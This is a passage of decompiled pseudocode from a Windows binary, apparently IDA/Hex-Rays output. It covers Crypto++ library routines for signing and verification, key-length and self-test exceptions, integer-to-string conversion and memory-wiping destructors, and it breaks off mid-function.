//----- (00435750) --------------------------------------------------------
int __thiscall sub_435750(_DWORD *this, void *a2, unsigned __int8 *a3, int a4, int a5)
{
  int v6; // eax
  int v7; // eax
  int *v8; // eax
  int v9; // edx
  int *v10; // esi
  int v11; // eax
  int v12; // esi
  int v13; // eax
  unsigned int v14; // esi
  void *v15; // eax
  int v16; // esi
  int v17; // edi
  int v18; // ebx
  unsigned int v19; // eax
  int v20; // eax
  unsigned int v21; // esi
  void *v22; // ebx
  unsigned int v23; // edi
  int v24; // eax
  _DWORD *v25; // eax
  unsigned int *v26; // ecx
  unsigned int v27; // edx
  unsigned int v28; // edx
  void *v30; // [esp-Ch] [ebp-68h]
  int v31; // [esp-8h] [ebp-64h]
  void *v32; // [esp+0h] [ebp-5Ch]
  void *v33; // [esp+0h] [ebp-5Ch]
  _DWORD v34[2]; // [esp+20h] [ebp-3Ch] BYREF
  unsigned int v35; // [esp+28h] [ebp-34h]
  unsigned int v36; // [esp+2Ch] [ebp-30h]
  void *v37; // [esp+30h] [ebp-2Ch]
  char v38[8]; // [esp+38h] [ebp-24h] BYREF
  unsigned int v39; // [esp+40h] [ebp-1Ch] BYREF
  unsigned int v40; // [esp+44h] [ebp-18h] BYREF
  void *v41; // [esp+48h] [ebp-14h]
  int v42; // [esp+58h] [ebp-4h]
  int v43; // [esp+5Ch] [ebp+0h] BYREF
  int v44; // [esp+60h] [ebp+4h]
  int v45; // [esp+64h] [ebp+8h]
  _DWORD *v46; // [esp+68h] [ebp+Ch]
  _DWORD *v47; // [esp+6Ch] [ebp+10h]
  unsigned __int8 *v48; // [esp+70h] [ebp+14h]
  unsigned int v49; // [esp+74h] [ebp+18h]
  void *v50; // [esp+78h] [ebp+1Ch]
  int *v51; // [esp+7Ch] [ebp+20h]
  void *Block; // [esp+80h] [ebp+24h]
  char pExceptionObject[40]; // [esp+84h] [ebp+28h] BYREF

  v47 = this;
  Block = a2;
  v45 = a4;
  v6 = *this;
  v48 = a3;
  (*(void (__thiscall **)(_DWORD *, int *))(v6 + 60))(this, &v43);
  v7 = this[2];
  v46 = this + 2;
  v8 = (int *)(*(int (**)(void))(v7 + 12))();
  v9 = *(_DWORD *)a3;
  v10 = v8;
  v51 = v8;
  v11 = (*(int (__thiscall **)(unsigned __int8 *))(v9 + 76))(a3);
  v12 = *v10;
  v13 = (*(int (__thiscall **)(int))(*(_DWORD *)v11 + 32))(v11);
  v14 = (*(int (__thiscall **)(int *, int, int))(v12 + 4))(v51, v44, v13);
  if ( sub_4353B0(this) < v14 )
  {
    sub_434810(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v15 = (void *)((sub_4353B0(this) + 7) >> 3);
  v49 = (unsigned int)v15;
  if ( v15 )
    v15 = sub_45AEA0((size_t)v15);
  v50 = v15;
  v16 = *((_DWORD *)a3 + 3);
  v17 = *((_DWORD *)a3 + 4);
  v18 = *v51;
  v42 = 1;
  v19 = sub_4353B0(v47);
  v20 = (*(int (__thiscall **)(unsigned __int8 *, int, int, _DWORD, void *, unsigned int))(*(_DWORD *)v48 + 76))(
          v48,
          v43,
          v44,
          v48[116],
          v50,
          v19);
  (*(void (__thiscall **)(int *, void *, int, int, int))(v18 + 24))(v51, Block, v17, v16, v20);
  v21 = v49;
  v22 = v50;
  v31 = v49;
  v30 = v50;
  v48[116] = 1;
  sub_43D570(v34, (int)v30, v31, 0, 1);
  LOBYTE(v42) = 2;
  v23 = (*(int (__thiscall **)(_DWORD *))(*v47 + 4))(v47);
  v49 = v23;
  v24 = (*(int (__thiscall **)(_DWORD *))(*v46 + 8))(v46);
  v25 = (_DWORD *)(*(int (__thiscall **)(int, char *, void *, _DWORD *))(*(_DWORD *)v24 + 4))(v24, v38, Block, v34);
  LOBYTE(v42) = 3;
  sub_441BE0(v25, v45, v23, 0);
  v26 = &v39;
  if ( v39 >= v40 )
    v26 = &v40;
  Block = v41;
  v32 = v41;
  LOBYTE(v42) = 4;
  v27 = *v26;
  memset(v41, 0, 4 * *v26);
  if ( v27 )
    j_j_unknown_libname_61(v32);
  else
    j_j___free_base(v32);
  v28 = v36;
  if ( v35 < v36 )
    v28 = v35;
  Block = v37;
  v33 = v37;
  LOBYTE(v42) = 5;
  memset(v37, 0, 4 * v28);
  if ( v28 )
    j_j_unknown_libname_61(v33);
  else
    j_j___free_base(v33);
  v42 = 6;
  memset(v22, 0, v21);
  j_j___free_base(v22);
  return v49;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 435750: using guessed type _DWORD var_90[2];
// 435750: using guessed type char var_78[8];

//----- (00435960) --------------------------------------------------------
int __thiscall sub_435960(_DWORD *this, int a2)
{
  int *v3; // ebp
  int v4; // eax
  int v5; // esi
  int v6; // eax
  unsigned int v7; // esi
  int v8; // esi
  int v9; // edi
  unsigned int v10; // eax
  int v11; // eax
  int result; // eax
  int v14; // [esp+14h] [ebp-34h] BYREF
  int v15; // [esp+18h] [ebp-30h]
  char pExceptionObject[40]; // [esp+1Ch] [ebp-2Ch] BYREF

  (*(void (__thiscall **)(_DWORD *, int *))(*this + 68))(this, &v14);
  v3 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v4 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 76))(a2);
  v5 = *v3;
  v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 32))(v4);
  v7 = (*(int (__thiscall **)(int *, int, int))(v5 + 4))(v3, v15, v6);
  if ( sub_4353B0(this) < v7 )
  {
    sub_434810(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v8 = *(_DWORD *)(a2 + 32);
  v9 = *v3;
  v10 = sub_4353B0(this);
  v11 = (*(int (__thiscall **)(int, int, int, _DWORD, int, unsigned int))(*(_DWORD *)a2 + 76))(
          a2,
          v14,
          v15,
          *(unsigned __int8 *)(a2 + 116),
          v8,
          v10);
  result = (*(int (__thiscall **)(int *, int))(v9 + 28))(v3, v11);
  *(_BYTE *)(a2 + 116) = 1;
  return result;
}

//----- (00435A20) --------------------------------------------------------
bool __thiscall sub_435A20(int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  unsigned int v9; // ebx
  __m128i *v10; // edi
  int v11; // esi
  int *v12; // eax
  bool v13; // bl
  int v15; // [esp-4h] [ebp-48h]
  unsigned int v16; // [esp+20h] [ebp-24h]

  v8 = a7;
  v9 = (unsigned int)(a7 + 7) >> 3;
  v16 = v9;
  if ( v9 )
  {
    v10 = (__m128i *)sub_45AEA0((unsigned int)(a7 + 7) >> 3);
    v8 = a7;
  }
  else
  {
    v10 = 0;
  }
  v11 = *this;
  v15 = v8;
  v12 = sub_437650();
  (*(void (__thiscall **)(int *, int *, _DWORD, _DWORD, int, int, int, int, __m128i *, int))(v11 + 24))(
    this,
    v12,
    0,
    0,
    a2,
    a3,
    a4,
    a5,
    v10,
    v15);
  v13 = sub_45AF10(a6, v10, v9);
  memset(v10, 0, v16);
  j_j___free_base(v10);
  return v13;
}

//----- (00435AF0) --------------------------------------------------------
char __stdcall sub_435AF0(int a1, int a2, int a3)
{
  return 0;
}

//----- (00435B30) --------------------------------------------------------
int __cdecl sub_435B30(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  int result; // eax
  size_t v6; // esi
  unsigned int v7; // eax
  unsigned int v8; // edx
  char v9; // al
  int v10; // edi
  char v11; // al
  size_t v12; // edx
  __int64 v13; // kr08_8
  void **v14; // ecx
  unsigned int v15; // edi
  int v16; // ecx
  size_t v17; // eax
  void *v18; // eax
  _DWORD *v19; // esi
  _DWORD *v20; // eax
  _BYTE *v21; // edi
  char *v22; // edi
  char *v23; // eax
  __int128 *v24; // eax
  void *v25; // ecx
  __int128 *v26; // eax
  __int128 v27; // xmm0
  _BYTE *v28; // [esp+10h] [ebp-60h]
  unsigned int v29; // [esp+14h] [ebp-5Ch]
  int v30; // [esp+18h] [ebp-58h]
  int v31; // [esp+20h] [ebp-50h]
  int v32; // [esp+24h] [ebp-4Ch]
  _BYTE *Size; // [esp+28h] [ebp-48h]
  char v34; // [esp+2Ch] [ebp-44h]
  char v35; // [esp+2Ch] [ebp-44h]
  __int128 v36; // [esp+30h] [ebp-40h] BYREF
  __int64 v37; // [esp+40h] [ebp-30h]
  void *Src[4]; // [esp+48h] [ebp-28h] BYREF
  __int64 v39; // [esp+58h] [ebp-18h]
  int v40; // [esp+6Ch] [ebp-4h]
  unsigned int v41; // [esp+7Ch] [ebp+Ch]
  int v42; // [esp+80h] [ebp+10h]

  v3 = 0;
  v4 = a3 & 0x7FFFFFFF;
  v29 = a3 >> 26;
  v42 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v6 = 0;
    v37 = 0xF00000000i64;
    v7 = abs32(a2);
    v8 = a2 >> 31;
    v41 = a2 >> 31;
    LOBYTE(v36) = 0;
    v40 = 0;
    if ( (int)v7 > 0 )
    {
      while ( 1 )
      {
        v30 = v7 / v4;
        v32 = v7 % v4;
        v9 = (int)(v7 % v4) >= 10 ? (~(_BYTE)v29 & 0x20 | 0x41) - 10 : 48;
        v34 = v9;
        LOBYTE(v40) = 1;
        v10 = v3 | 2;
        v39 = 0xF00000000i64;
        LOBYTE(Src[0]) = 0;
        v31 = v10;
        sub_4196B0(Src, v6 + 1);
        v11 = v32 + v34;
        v12 = v39;
        v35 = v32 + v34;
        v13 = v39;
        if ( (unsigned int)v39 >= HIDWORD(v39) )
        {
          if ( (_DWORD)v39 == 0x7FFFFFFF )
            sub_4257D0();
          v15 = (v39 + 1) | 0xF;
          if ( v15 <= 0x7FFFFFFF )
          {
            v16 = HIDWORD(v39) >> 1;
            if ( HIDWORD(v39) <= 0x7FFFFFFF - (HIDWORD(v39) >> 1) )
            {
              if ( v15 < HIDWORD(v39) + v16 )
                v15 = HIDWORD(v39) + v16;
            }
            else
            {
              v15 = 0x7FFFFFFF;
            }
          }
          else
          {
            v15 = 0x7FFFFFFF;
          }
          if ( v15 + 1 < 0x1000 )
          {
            if ( v15 == -1 )
            {
              v19 = 0;
            }
            else
            {
              v20 = operator new(v15 + 1);
              v12 = v13;
              v19 = v20;
            }
          }
          else
          {
            v17 = v15 + 36;
            if ( v15 + 36 <= v15 + 1 )
              v17 = -1;
            v18 = operator new(v17);
            if ( !v18 )
LABEL_47:
              _invalid_parameter_noinfo_noreturn();
            v12 = v13;
            v19 = (_DWORD *)(((unsigned int)v18 + 35) & 0xFFFFFFE0);
            *(v19 - 1) = v18;
          }
          HIDWORD(v39) = v15;
          LODWORD(v39) = v12 + 1;
          v21 = (char *)v19 + v12;
          v28 = (char *)v19 + v12;
          Size = (char *)v19 + v12 + 1;
          if ( HIDWORD(v13) < 0x10 )
          {
            memmove(v19, Src, v12);
            *v21 = v35;
            *Size = 0;
          }
          else
          {
            v22 = (char *)Src[0];
            memmove(v19, Src[0], v12);
            *v28 = v35;
            *(_BYTE *)v13 = 0;
            v23 = v22;
            if ( (unsigned int)(HIDWORD(v13) + 1) >= 0x1000 )
            {
              v22 = (char *)*((_DWORD *)v22 - 1);
              if ( (unsigned int)(v23 - v22 - 4) > 0x1F )
                goto LABEL_47;
            }
            sub_46C87D(v22);
          }
          v10 = v31;
          Src[0] = v19;
        }
        else
        {
          LODWORD(v39) = v39 + 1;
          v14 = Src;
          if ( HIDWORD(v39) >= 0x10 )
            v14 = (void **)Src[0];
          *((_BYTE *)v14 + v12) = v11;
          *((_BYTE *)v14 + v12 + 1) = 0;
        }
        v24 = &v36;
        if ( HIDWORD(v37) >= 0x10 )
          v24 = (__int128 *)v36;
        sub_41F120((char *)Src, v24, v37);
        if ( HIDWORD(v37) >= 0x10 )
        {
          v25 = (void *)v36;
          if ( (unsigned int)(HIDWORD(v37) + 1) >= 0x1000 )
          {
            v25 = *(void **)(v36 - 4);
            if ( (unsigned int)(v36 - (_DWORD)v25 - 4) > 0x1F )
              goto LABEL_47;
          }
          sub_46C87D(v25);
        }
        v7 = v30;
        v3 = v10 & 0xFFFFFFFD;
        LOBYTE(v40) = 0;
        v36 = *(_OWORD *)Src;
        v37 = v39;
        v6 = v39;
        if ( v30 <= 0 )
          break;
        v4 = v42;
      }
      LOBYTE(v8) = v41;
    }
    if ( (_BYTE)v8 )
    {
      LOBYTE(v40) = 2;
      v39 = 0xF00000000i64;
      LOBYTE(Src[0]) = 0;
      sub_4196B0(Src, v6 + 1);
      sub_41F120((char *)Src, "-", 1u);
      v26 = &v36;
      if ( HIDWORD(v37) >= 0x10 )
        v26 = (__int128 *)v36;
      sub_41F120((char *)Src, v26, v6);
      sub_419A60(&v36, Src);
      sub_4199E0(Src);
    }
    result = a1;
    v27 = v36;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = v27;
    *(_QWORD *)(a1 + 16) = v37;
  }
  else
  {
    sub_419B80(a1, "0");
    return a1;
  }
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00435E90) --------------------------------------------------------
void *__thiscall sub_435E90(void *this, char a2)
{
  char v4[40]; // [esp+8h] [ebp-78h] BYREF
  char pExceptionObject[40]; // [esp+30h] [ebp-50h] BYREF
  _DWORD v6[6]; // [esp+58h] [ebp-28h] BYREF
  int v7; // [esp+7Ch] [ebp-4h]

  if ( a2 && sub_402000() )
  {
    if ( !sub_462940() && !sub_402000() )
    {
      sub_419B80((int)v6, "Cryptographic algorithms are disabled before the power-up self tests are performed.");
      v7 = 0;
      sub_436580(pExceptionObject, v6);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
    if ( sub_462940() == 1 )
    {
      sub_419B80((int)v6, "Cryptographic algorithms are disabled after a power-up self test failed.");
      v7 = 1;
      sub_436580(v4, v6);
      _CxxThrowException(v4, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
  }
  return this;
}
// 435E90: using guessed type _DWORD var_28[6];

//----- (00435F70) --------------------------------------------------------
char *__thiscall sub_435F70(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::InvalidCiphertext::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91E8: using guessed type void *CryptoPP::InvalidCiphertext::`vftable';

//----- (00436000) --------------------------------------------------------
char *__thiscall sub_436000(char *this, _DWORD *a2)
{
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 4;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::InvalidCiphertext::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91E8: using guessed type void *CryptoPP::InvalidCiphertext::`vftable';

//----- (00436070) --------------------------------------------------------
char *__thiscall sub_436070(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::InvalidKeyLength::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B9284: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';

//----- (00436100) --------------------------------------------------------
char *__thiscall sub_436100(char *this, size_t *a2, unsigned int a3)
{
  size_t *v4; // edi
  unsigned int v5; // eax
  char *v6; // eax
  void **v7; // eax
  unsigned int v8; // edx
  void *v9; // ecx
  void *v10; // ecx
  void *v11; // ecx
  void *v12; // ecx
  char *v14; // [esp+14h] [ebp-78h]
  void *v15; // [esp+1Ch] [ebp-70h] BYREF
  unsigned int v16; // [esp+30h] [ebp-5Ch]
  __int128 v17; // [esp+34h] [ebp-58h] BYREF
  __int64 v18; // [esp+44h] [ebp-48h]
  int v19[5]; // [esp+4Ch] [ebp-40h] BYREF
  unsigned int v20; // [esp+60h] [ebp-2Ch]
  void *v21[4]; // [esp+64h] [ebp-28h] BYREF
  int v22; // [esp+74h] [ebp-18h]
  unsigned int v23; // [esp+78h] [ebp-14h]
  int v24; // [esp+88h] [ebp-4h]

  v4 = a2;
  v14 = (char *)sub_434410((int)&v15, a3, 0xAu);
  v24 = 1;
  v5 = a2[4] + 2;
  v22 = 0;
  v23 = 15;
  LOBYTE(v21[0]) = 0;
  sub_4196B0(v21, v5);
  if ( a2[5] >= 0x10 )
    v4 = (size_t *)*a2;
  sub_41F120((char *)v21, v4, a2[4]);
  sub_41F120((char *)v21, ": ", 2u);
  v6 = (char *)sub_4220E0((int)v19, (int)v21, v14);
  LOBYTE(v24) = 2;
  v7 = sub_41F120(v6, " is not a valid key length", 0x1Au);
  v17 = *(_OWORD *)v7;
  v18 = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v24) = 4;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 1;
  sub_419BE0((_DWORD *)this + 4, &v17);
  v8 = HIDWORD(v18);
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  if ( v8 >= 0x10 )
  {
    v9 = (void *)v17;
    if ( v8 + 1 >= 0x1000 )
    {
      v9 = *(void **)(v17 - 4);
      if ( (unsigned int)(v17 - (_DWORD)v9 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v9);
  }
  if ( v20 >= 0x10 )
  {
    v10 = (void *)v19[0];
    if ( v20 + 1 >= 0x1000 )
    {
      v10 = *(void **)(v19[0] - 4);
      if ( (unsigned int)(v19[0] - (_DWORD)v10 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v10);
  }
  v19[4] = 0;
  v20 = 15;
  LOBYTE(v19[0]) = 0;
  if ( v23 >= 0x10 )
  {
    v11 = v21[0];
    if ( v23 + 1 >= 0x1000 )
    {
      v11 = (void *)*((_DWORD *)v21[0] - 1);
      if ( (unsigned int)(v21[0] - v11 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v11);
  }
  v22 = 0;
  v23 = 15;
  LOBYTE(v21[0]) = 0;
  if ( v16 >= 0x10 )
  {
    v12 = v15;
    if ( v16 + 1 < 0x1000
      || (v12 = (void *)*((_DWORD *)v15 - 1), (unsigned int)((_BYTE *)v15 - (_BYTE *)v12 - 4) <= 0x1F) )
    {
      sub_46C87D(v12);
      goto LABEL_19;
    }
LABEL_20:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_19:
  *(_DWORD *)this = &CryptoPP::InvalidKeyLength::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 4B9284: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';

//----- (00436340) --------------------------------------------------------
char *__thiscall sub_436340(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B920C: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';

//----- (004363D0) --------------------------------------------------------
char *__thiscall sub_4363D0(char *this, size_t *a2)
{
  size_t *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  void *v6; // ecx
  void *v8[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v4 = a2[4] + 47;
  v10 = 0;
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  sub_4196B0(v8, v4);
  if ( a2[5] >= 0x10 )
    v3 = (size_t *)*a2;
  sub_41F120((char *)v8, v3, a2[4]);
  sub_41F120((char *)v8, ": this object doesn't support multiple channels", 0x2Fu);
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v10) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 0;
  sub_419BE0((_DWORD *)this + 4, v8);
  v5 = v9;
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  if ( v5 >= 0x10 )
  {
    v6 = v8[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4B920C: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';

//----- (004364F0) --------------------------------------------------------
char *__thiscall sub_4364F0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::SelfTestFailure::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B93C0: using guessed type void *CryptoPP::SelfTestFailure::`vftable';

//----- (00436580) --------------------------------------------------------
char *__thiscall sub_436580(char *this, _DWORD *a2)
{
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::SelfTestFailure::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B93C0: using guessed type void *CryptoPP::SelfTestFailure::`vftable';

//----- (0043661B) --------------------------------------------------------
char *__thiscall sub_43661B(char *this, char a2)
{
  char *v2; // ecx
  char *v3; // esi

  v2 = this - 4;
  v3 = v2;
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v3;
}

//----- (00436660) --------------------------------------------------------
void *__thiscall sub_436660(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00436680) --------------------------------------------------------
int __thiscall sub_436680(int this, char a2)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  void *v5; // edx
  void (__thiscall ***v6)(_DWORD, int); // ecx

  v3 = *(_DWORD *)(this + 80);
  v4 = *(_DWORD *)(this + 84);
  v5 = *(void **)(this + 88);
  if ( v3 < v4 )
    v4 = v3;
  memset(*(void **)(this + 88), 0, v4);
  j_j___free_base(v5);
  boost::exception::~exception((boost::exception *)(this + 36));
  v6 = *(void (__thiscall ****)(_DWORD, int))(this + 12);
  if ( v6 )
    (**v6)(v6, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);

//----- (00436710) --------------------------------------------------------
int __thiscall sub_436710(int this, char a2)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  void *v5; // edx
  void (__thiscall ***v6)(_DWORD, int); // ecx

  v3 = *(_DWORD *)(this + 80);
  v4 = *(_DWORD *)(this + 84);
  v5 = *(void **)(this + 88);
  if ( v3 < v4 )
    v4 = v3;
  memset(*(void **)(this + 88), 0, v4);
  j_j___free_base(v5);
  boost::exception::~exception((boost::exception *)(this + 36));
  v6 = *(void (__thiscall ****)(_DWORD, int))(this + 12);
  if ( v6 )
    (**v6)(v6, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);

//----- (004367A0) --------------------------------------------------------
unsigned int __thiscall sub_4367A0(
        void *this,
        unsigned int a2,
        unsigned int a3,
        unsigned int a4,
        unsigned int a5,
        char a6)
{
  unsigned int v6; // edi
  unsigned int v7; // ebx
  char v8; // al
  int v9; // edx
  unsigned int v10; // ecx
  int v11; // ebp
  int v12; // ebp
  unsigned int v13; // esi
  unsigned int v14; // ebp
  bool v15; // dl
  int v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-4h]
  bool v21; // [esp+2Ch] [ebp+Ch]
  int v22; // [esp+34h] [ebp+14h]

  v6 = a2;
  v7 = (*(int (__fastcall **)(void *))(*(_DWORD *)this + 20))(this);
  v8 = a6;
  v9 = v7;
  if ( (a6 & 3) != 0 )
    v9 = 0;
  v10 = a3;
  v11 = 0;
  v20 = v9;
  if ( a3 )
    v11 = v7;
  v18 = v11;
  v12 = v7;
  if ( (a6 & 2) != 0 )
    v12 = 0;
  v13 = a4;
  v17 = v12;
  v14 = a5;
  if ( (a6 & 8) != 0 )
  {
    v20 = -v9;
    v6 = a5 - v7 + a2;
    v10 = a5 - v7 + a3;
    a3 = v10;
    v13 = a5 - v7 + a4;
    v18 = -v18;
    v17 = -v17;
    v8 = a6;
  }
  v15 = v10 && (v8 & 4) != 0;
  v21 = v15;
  if ( a5 >= v7 )
  {
    v22 = v8 & 1;
    do
    {
      if ( v15 )
      {
        sub_45B110(v13, v10, v6, v7);
        (*(void (__stdcall **)(unsigned int, _DWORD, unsigned int))(*(_DWORD *)this + 16))(v13, 0, v13);
      }
      else
      {
        (*(void (__stdcall **)(unsigned int, unsigned int, unsigned int))(*(_DWORD *)this + 16))(v6, v10, v13);
      }
      if ( v22 )
        ++*(_BYTE *)(v7 + v6 - 1);
      v14 -= v7;
      v10 = v18 + a3;
      v6 += v20;
      v13 += v17;
      v15 = v21;
      a3 += v18;
    }
    while ( v14 >= v7 );
  }
  return v14;
}

//----- (004368B0) --------------------------------------------------------
int __stdcall sub_4368B0(int a1)
{
  sub_419B80(a1, "BitBucket");
  return a1;
}

//----- (004368D0) --------------------------------------------------------
int __stdcall sub_4368D0(int a1)
{
  sub_419B80(a1, "NullRNG");
  return a1;
}

//----- (004368F0) --------------------------------------------------------
char __thiscall sub_4368F0(int *this)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax

  v2 = (*(int (__thiscall **)(int *))(*this + 164))(this);
  v3 = *this;
  if ( !v2 )
    return (*(int (__thiscall **)(int *))(v3 + 96))(this) != 0;
  v4 = (*(int (__thiscall **)(int *))(v3 + 164))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 100))(v4);
}

//----- (00436920) --------------------------------------------------------
char __thiscall sub_436920(int *this)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax
  char v6; // [esp+7h] [ebp-1h] BYREF

  v2 = (*(int (__thiscall **)(int *))(*this + 164))(this);
  v3 = *this;
  if ( !v2 )
    return (*(int (__thiscall **)(int *, char *))(v3 + 84))(this, &v6) != 0;
  v4 = (*(int (__thiscall **)(int *))(v3 + 164))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 68))(v4);
}

//----- (00436960) --------------------------------------------------------
int __thiscall sub_436960(void *this, int a2)
{
  int v3; // eax
  int v4; // eax

  if ( !(*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 172))(this, a2);
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v3 + 160))(v3) )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 172))(this, a2);
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 176))(v4, a2);
}

//----- (004369B0) --------------------------------------------------------
int __thiscall sub_4369B0(int *this, int a2, int a3)
{
  int v3; // edx
  size_t *v5; // eax
